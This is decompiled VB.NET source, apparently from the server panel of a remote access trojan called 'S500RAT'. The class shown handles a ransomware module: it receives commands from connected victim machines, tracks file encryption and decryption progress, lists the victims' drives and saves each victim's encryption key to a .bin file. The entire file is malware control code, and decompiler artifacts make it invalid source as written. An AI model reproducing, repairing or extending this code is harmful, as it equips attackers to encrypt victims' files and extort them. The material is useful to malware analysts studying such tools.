Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000058 RID: 88
	Friend Class FrmRansomware
		' Token: 0x060011A5 RID: 4517 RVA: 0x0009BC30 File Offset: 0x00099E30
		Public Sub New()
			Me.LockList = RuntimeHelpers.GetObjectValue(New Object())
			Me.LockComplete = RuntimeHelpers.GetObjectValue(New Object())
		End Sub

		' Token: 0x060011A6 RID: 4518 RVA: 0x0009BC5C File Offset: 0x00099E5C
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Dim CS$<>8__locals1 As FrmRansomware._Closure$__3-1 = New FrmRansomware._Closure$__3-1(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Me = Me
			CS$<>8__locals1.$VB$Local_unpack_msgpack = unpack_msgpack
			Try
				Dim CS$<>8__locals2 As FrmRansomware._Closure$__3-0 = New FrmRansomware._Closure$__3-0(CS$<>8__locals2)
				CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1
				CS$<>8__locals2.$VB$Local_Rnsomware = CType(Application.OpenForms("FormRansomware" + CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Hwid").AsString), FormRansomware)
				Dim flag As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware Is Nothing
				If flag Then
					Debug.WriteLine("Error")
					client.Disconnected()
				Else
					Dim asString As String = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Command").AsString
					Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
					If num <= 1653514658UI Then
						If num <= 1624967825UI Then
							If num <> 386248585UI Then
								If num = 1624967825UI Then
									If Operators.CompareString(asString, "DecryptComplete", False) = 0 Then
										Dim flag2 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
										If flag2 Then
											Try
												CS$<>8__locals2.$VB$Local_Rnsomware.Decrypt.Text = "Decrypt"
												CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Text = "Encrypt"
												CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Enabled = True
												CS$<>8__locals2.$VB$Local_Rnsomware.ProgressBar1.Value = 0
												CS$<>8__locals2.$VB$Local_Rnsomware.State.Text = "Files has been Decrypted Successfully"
												CS$<>8__locals2.$VB$Local_Rnsomware.State.ForeColor = Color.LimeGreen
												CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.Text = "..."
												CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.LinkColor = Color.White
												CS$<>8__locals2.$VB$Local_Rnsomware.EncryptLogs.Rows.Clear()
											Catch ex As Exception
											End Try
										End If
									End If
								End If
							ElseIf Operators.CompareString(asString, "EncryptComplete", False) = 0 Then
								Dim flag3 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
								If flag3 Then
									Try
										CS$<>8__locals2.$VB$Local_Rnsomware.Decrypt.Text = "Decrypt"
										CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Text = "Encrypt"
										CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Enabled = True
										CS$<>8__locals2.$VB$Local_Rnsomware.ProgressBar1.Value = 0
										CS$<>8__locals2.$VB$Local_Rnsomware.State.Text = "Files has been Encrypted Successfully"
										CS$<>8__locals2.$VB$Local_Rnsomware.State.ForeColor = Color.LimeGreen
										CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.Text = "..."
										CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.LinkColor = Color.White
										Dim path As String = CS$<>8__locals2.$VB$Local_Rnsomware.FullPath + CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Key").AsString + ".bin"
										Dim flag4 As Boolean = Not File.Exists(path)
										If flag4 Then
											File.WriteAllText(path, CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Key").AsString)
										End If
										CS$<>8__locals2.$VB$Local_Rnsomware.SaveExtension()
									Catch ex2 As Exception
									End Try
								End If
							End If
						ElseIf num <> 1649565857UI Then
							If num = 1653514658UI Then
								If Operators.CompareString(asString, "Complete", False) = 0 Then
									Try
										Dim lockComplete As Object = Me.LockComplete
										ObjectFlowControl.CheckForSyncLockOnValueType(lockComplete)
										SyncLock lockComplete
											' The following expression was wrapped in a checked-expression
											CS$<>8__locals2.$VB$Local_Rnsomware.ProgressBar1.Value = CInt(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Value").AsInteger)
										End SyncLock
									Catch ex3 As Exception
									End Try
								End If
							End If
						ElseIf Operators.CompareString(asString, "NotFoundRecovery", False) = 0 Then
							Dim flag6 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
							If flag6 Then
								Try
									CS$<>8__locals2.$VB$Local_Rnsomware.Decrypt.Text = "Decrypt"
									CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Text = "Encrypt"
									CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Enabled = True
									CS$<>8__locals2.$VB$Local_Rnsomware.ProgressBar1.Value = 0
									CS$<>8__locals2.$VB$Local_Rnsomware.State.Text = ""
									CS$<>8__locals2.$VB$Local_Rnsomware.State.ForeColor = Color.White
									CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.Text = "..."
									CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.LinkColor = Color.White
								Catch ex4 As Exception
								End Try
							End If
						End If
					ElseIf num <= 2368288673UI Then
						If num <> 2082903604UI Then
							If num = 2368288673UI Then
								If Operators.CompareString(asString, "List", False) = 0 Then
									ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
										MyBase._Lambda$__0()
									End Sub)
								End If
							End If
						ElseIf Operators.CompareString(asString, "setClient", False) = 0 Then
							Dim flag7 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
							If flag7 Then
								Dim flag8 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware.Client Is Nothing
								If flag8 Then
									CS$<>8__locals2.$VB$Local_Rnsomware.Client = client
									CS$<>8__locals2.$VB$Local_Rnsomware.IsConnected = True
								End If
							End If
							Dim flag9 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
							If flag9 Then
								Dim asString2 As String = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("GetDrivers").AsString
								Try
									CS$<>8__locals2.$VB$Local_Rnsomware.GetDriversComboBox.Items.Clear()
									Dim array As String() = Strings.Split(asString2, "!*", -1, CompareMethod.Binary)
									For Each text As String In array
										Dim flag10 As Boolean = Operators.CompareString(text, "", False) <> 0
										If flag10 Then
											Dim flag11 As Boolean = Operators.CompareString(text, "C:\", False) <> 0
											If flag11 Then
												CS$<>8__locals2.$VB$Local_Rnsomware.GetDriversComboBox.Items.Add(text)
											End If
										End If
									Next
									Dim flag12 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware.GetDriversComboBox.Items.Count > 0
									If flag12 Then
										CS$<>8__locals2.$VB$Local_Rnsomware.GetDriversComboBox.SelectedIndex = 0
									End If
									Debug.WriteLine("Complete")
								Catch ex5 As Exception
									CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.Text = ex5.Message
									CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.LinkColor = Color.Red
									CS$<>8__locals2.$VB$Local_Rnsomware.State.Text = ""
									Dim flag13 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware.GetDriversComboBox.Items.Count <= 0
									If flag13 Then
										CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Enabled = False
										CS$<>8__locals2.$VB$Local_Rnsomware.Decrypt.Enabled = False
									End If
								End Try
							End If
						End If
					ElseIf num <> 4086144241UI Then
						If num = 4188122820UI Then
							If Operators.CompareString(asString, "FoundRecovery", False) = 0 Then
								Dim flag14 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
								If flag14 Then
									Try
										CS$<>8__locals2.$VB$Local_Rnsomware.Decrypt.Text = "Decrypt"
										CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Text = "Encrypt"
										CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Enabled = True
										CS$<>8__locals2.$VB$Local_Rnsomware.ProgressBar1.Value = 0
										CS$<>8__locals2.$VB$Local_Rnsomware.State.Text = "Detected encrypted files"
										CS$<>8__locals2.$VB$Local_Rnsomware.State.ForeColor = Color.Gold
										CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.Text = "..."
										CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.LinkColor = Color.White
									Catch ex6 As Exception
									End Try
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "Error", False) = 0 Then
						Dim flag15 As Boolean = CS$<>8__locals2.$VB$Local_Rnsomware IsNot Nothing
						If flag15 Then
							Try
								CS$<>8__locals2.$VB$Local_Rnsomware.Decrypt.Text = "Decrypt"
								CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Text = "Encrypt"
								CS$<>8__locals2.$VB$Local_Rnsomware.Crypt.Enabled = True
								CS$<>8__locals2.$VB$Local_Rnsomware.ProgressBar1.Value = 0
								CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.Text = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Error").AsString
								CS$<>8__locals2.$VB$Local_Rnsomware.FileEncrypError.LinkColor = Color.Red
								CS$<>8__locals2.$VB$Local_Rnsomware.State.Text = ""
								CS$<>8__locals2.$VB$Local_Rnsomware.State.ForeColor = Color.White
								CS$<>8__locals2.$VB$Local_Rnsomware.EncryptLogs.Rows.Clear()
							Catch ex7 As Exception
							End Try
						End If
					End If
				End If
			Catch ex8 As Exception
				ListLogs.AddArray("Ransomware " + client.IP + " Error : " + ex8.Message, 0)
			End Try
		End Sub

		' Token: 0x040007D3 RID: 2003
		Public LockList As Object

		' Token: 0x040007D4 RID: 2004
		Public LockComplete As Object
	End Class
End Namespace
